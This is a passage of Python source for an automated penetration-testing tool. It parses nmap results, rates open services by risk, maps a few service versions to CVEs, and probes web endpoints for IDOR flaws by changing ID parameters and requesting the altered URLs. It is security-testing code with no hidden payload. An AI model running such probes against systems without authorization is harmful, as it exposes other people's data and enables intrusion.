                    scan_results.append(output)
                    
                    # Parse results for vulnerabilities
                    vulns = self._parse_nmap_output(output, cmd[1])
                    vulnerabilities.extend(vulns)
                    
                except asyncio.TimeoutError:
                    logging.warning(f"Nmap scan timed out for command: {' '.join(cmd[:3])}")
                except Exception as e:
                    logging.error(f"Nmap scan error for {' '.join(cmd[:3])}: {e}")
                    
        except Exception as e:
            logging.error(f"Network scanning error: {e}")
        
        return vulnerabilities
    
    def _parse_nmap_output(self, output: str, scan_type: str) -> List[Dict]:
        """Parse nmap output for security findings"""
        vulnerabilities = []
        
        try:
            lines = output.split('\n')
            current_port = None
            
            for line in lines:
                line = line.strip()
                
                # Parse open ports
                if '/tcp' in line or '/udp' in line:
                    if 'open' in line:
                        port_info = line.split()
                        if len(port_info) >= 3:
                            port_number = port_info[0].split('/')[0]
                            service = port_info[2] if len(port_info) > 2 else 'unknown'
                            
                            # Identify high-risk services
                            risk_level = self._assess_service_risk(port_number, service)
                            if risk_level in ['High', 'Critical']:
                                vulnerabilities.append({
                                    'type': 'Open Port',
                                    'severity': risk_level,
                                    'port': port_number,
                                    'service': service,
                                    'evidence': f'Port {port_number} ({service}) is open',
                                    'cvss_score': 7.5 if risk_level == 'High' else 9.0
                                })
                
                # Parse vulnerability script results
                if '|' in line and any(vuln_keyword in line.lower() for vuln_keyword in 
                                     ['cve-', 'vulnerable', 'exploit', 'weak', 'insecure']):
                    vulnerabilities.append({
                        'type': 'Network Vulnerability',
                        'severity': 'High',
                        'evidence': line.strip(),
                        'scan_type': scan_type,
                        'cvss_score': 8.0
                    })
                
                # Parse service version information for known vulnerabilities
                if 'version' in line.lower() and any(service in line.lower() for service in 
                                                   ['apache', 'nginx', 'ssh', 'ftp', 'mysql', 'postgresql']):
                    version_vuln = self._check_service_version_vulnerabilities(line)
                    if version_vuln:
                        vulnerabilities.append(version_vuln)
                        
        except Exception as e:
            logging.error(f"Error parsing nmap output: {e}")
        
        return vulnerabilities
    
    def _assess_service_risk(self, port: str, service: str) -> str:
        """Assess risk level of discovered services"""
        high_risk_ports = {
            '21': 'FTP - often misconfigured',
            '22': 'SSH - brute force target', 
            '23': 'Telnet - unencrypted',
            '25': 'SMTP - mail relay abuse',
            '53': 'DNS - information disclosure',
            '110': 'POP3 - credential exposure',
            '143': 'IMAP - credential exposure',
            '161': 'SNMP - information disclosure',
            '445': 'SMB - lateral movement',
            '1433': 'MSSQL - database access',
            '3306': 'MySQL - database access',
            '3389': 'RDP - brute force target',
            '5432': 'PostgreSQL - database access',
            '5900': 'VNC - remote access',
            '6379': 'Redis - often unauthenticated'
        }
        
        critical_services = ['telnet', 'ftp', 'rlogin', 'rsh']
        high_risk_services = ['ssh', 'rdp', 'vnc', 'mysql', 'postgresql', 'mssql', 'oracle', 'redis', 'mongodb']
        
        if service.lower() in critical_services:
            return 'Critical'
        elif port in high_risk_ports or service.lower() in high_risk_services:
            return 'High'
        elif port in ['80', '443', '8080', '8443']:
            return 'Medium'  # Web services - separate testing
        else:
            return 'Low'
    
    def _check_service_version_vulnerabilities(self, version_line: str) -> Optional[Dict]:
        """Check for known vulnerabilities in service versions"""
        # This is a simplified version - in practice, you'd integrate with CVE databases
        vulnerable_patterns = {
            'apache/2.2': {'cve': 'CVE-2017-15710', 'severity': 'High'},
            'openssh 7.4': {'cve': 'CVE-2018-15473', 'severity': 'Medium'},
            'mysql 5.5': {'cve': 'CVE-2016-6663', 'severity': 'High'},
            'nginx/1.10': {'cve': 'CVE-2017-7529', 'severity': 'High'}
        }
        
        for pattern, vuln_info in vulnerable_patterns.items():
            if pattern in version_line.lower():
                return {
                    'type': 'Known Vulnerability',
                    'severity': vuln_info['severity'],
                    'cve': vuln_info['cve'],
                    'evidence': version_line.strip(),
                    'cvss_score': 8.0 if vuln_info['severity'] == 'High' else 5.0
                }
        
        return None

    async def _test_idor(self, endpoint: str) -> List[Dict]:
        """IDOR testing implementation"""
        vulnerabilities = []
        
        try:
            # Extract potential ID parameters from URL
            parsed_url = urlparse(endpoint)
            query_params = parse_qs(parsed_url.query)
            
            # Look for common ID parameters
            id_params = ['id', 'user_id', 'account_id', 'order_id', 'file_id', 'doc_id']
            
            for param_name in id_params:
                if param_name in query_params:
                    original_value = query_params[param_name][0]
                    
                    # Test IDOR by modifying ID values
                    test_values = [
                        str(int(original_value) + 1) if original_value.isdigit() else None,
                        str(int(original_value) - 1) if original_value.isdigit() else None,
                        '1', '2', '999', '0', '-1'
                    ]
                    
                    for test_value in test_values:
                        if test_value:
                            # Create modified URL
                            modified_params = query_params.copy()
                            modified_params[param_name] = [test_value]
                            
                            # Reconstruct URL
                            new_query = '&'.join([f"{k}={v[0]}" for k, v in modified_params.items()])
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                            
                            try:
                                response = self.session.get(test_url, timeout=10)
                                
                                # Check for successful unauthorized access
                                if response.status_code == 200 and len(response.text) > 100:
                                    # Basic check - in practice, you'd need more sophisticated content analysis
                                    if any(indicator in response.text.lower() for indicator in 
                                          ['user', 'account', 'profile', 'data', 'information']):
                                        vulnerabilities.append({
                                            'type': 'Insecure Direct Object Reference (IDOR)',
                                            'severity': 'High',
                                            'parameter': param_name,
                                            'original_value': original_value,
                                            'test_value': test_value,
                                            'url': test_url,
                                            'evidence': f'IDOR vulnerability in parameter {param_name}',
                                            'cvss_score': 8.5
                                        })
                                        break  # Found IDOR, no need to test more values for this param
                                        
                            except Exception:
                                continue
                                
        except Exception as e:
            logging.error(f"IDOR testing error: {e}")
        
        return vulnerabilities

class ToolCall:
    """
    Elite VAPT Tool Execution System
    Streamlined implementation for strategic security testing
    """
    
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        self.setup_logging()
        
        # Initialize browser automation
        self.browser = PlaywrightTools(debug=self.config.get('debug', False))
        
        # Initialize elite VAPT tester
        self.vapt_tester = EliteVAPTTester(self.config)
        
        # Default configuration
        self.default_config = {
            'timeout': 600,
            'output_dir': './vapt_results',
            'debug': False
        }
        
        self.config = {**self.default_config, **self.config}
        Path(self.config['output_dir']).mkdir(parents=True, exist_ok=True)
    
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
    
    async def execute_plan_step(self, plan_step: Dict[str, str]) -> VAPTResult:
        """Execute strategic VAPT plan step"""
        self.logger.info(f"Executing plan: {plan_step.get('title', 'Unknown')}")
        
        try:
            result = await self.vapt_tester.execute_strategic_test(plan_step)
            
            # Log results
            self.logger.info(f"Plan execution completed: {result.success}")
            self.logger.info(f"Vulnerabilities found: {len(result.vulnerabilities)}")
            
            return result
            
        except Exception as e:
            self.logger.error(f"Plan execution error: {e}")
            return VAPTResult(
                success=False,
                tool_name="Plan Execution",
                command="strategic_test",
                output="",
                error=str(e)
            )